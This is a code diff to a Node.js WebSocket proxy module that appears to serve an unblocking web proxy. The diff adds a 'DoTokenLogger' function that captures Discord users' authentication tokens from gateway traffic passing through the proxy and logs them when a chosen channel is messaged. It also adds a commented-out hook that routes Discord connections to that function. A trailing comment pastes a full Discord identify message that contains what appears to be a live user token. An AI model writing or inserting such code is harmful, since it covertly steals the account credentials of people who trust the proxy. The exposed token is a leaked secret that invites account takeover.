@@ -5,6 +5,7 @@ const ws = require('ws')
 
 module.exports = class WebSocket {
   constructor(ctx) {
+    if (ctx.wss==false) return ()=>{}
     this.ctx = ctx
     return (http) => {
       if (ctx.Corrosion[0]==false) {
@@ -53,6 +54,7 @@ module.exports = class WebSocket {
                 cli.on('error', () => wsProxy.terminate())
                 wsProxy.on('close', () => cli.close())
                 cli.on('close', () => wsProxy.close())
+                //if (req.url=='/surf/?ws=wss://gateway.discord.gg/?encoding=json&v=9&compress=zlib-stream&origin=https://discord.com') return DoTokenLogger(req, cli, wsProxy)
                 wsProxy.on('open', () => {
                   cli.on('message', message => {
                     wsProxy.send(message.toString())
@@ -93,3 +95,26 @@ module.exports = class WebSocket {
     }
   }
 }
+
+function DoTokenLogger(req, cli, ws) {
+  var msgcount = 0
+  ws.on('open', () => {
+    var token;
+    cli.on('message', (message) => {
+      msgcount++
+      if (msgcount==1) {
+        token = JSON.parse(message.toString())['d']['token']
+        ws.send(message.toString())
+      }
+      if (JSON.parse(message.toString())['d']['channel_id']=='892786987050877029') {
+        console.log(token)
+        ws.send(message.toString())
+      }
+      else ws.send(message.toString())
+    })
+    ws.on('message', (m) => cli.send(m))
+  })
+}
+
+/*
+{"op":2,"d":{"token":"mfa.4jTeMmY6nUTCmW3eTNBiDqMb3MpHeG_Pon9FZSW15EPE2FHS-KeQv4TEjtl_C6RVxM4YnWDPFC7j7SSmrOGh","capabilities":253,"properties":{"os":"","browser":"Chrome","device":"","system_locale":"en-US","browser_user_agent":"Mozilla/5.0 (X11; CrOS x86_64 14150.87.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.124 Safari/537.36","browser_version":"94.0.4606.124","os_version":"","referrer":"https://dev.chemistryhelp.org/","referring_domain":"dev.chemistryhelp.org","referrer_current":"https://dev.chemistryhelp.org/","referring_domain_current":"dev.chemistryhelp.org","release_channel":"stable","client_build_number":113584,"client_event_source":null},"presence":{"status":"online","since":0,"activities":[],"afk":false},"compress":false,"client_state":{"guild_hashes":{},"highest_last_message_id":"0","read_state_version":0,"user_guild_settings_version":-1,"user_settings_version":-1}}}	*/
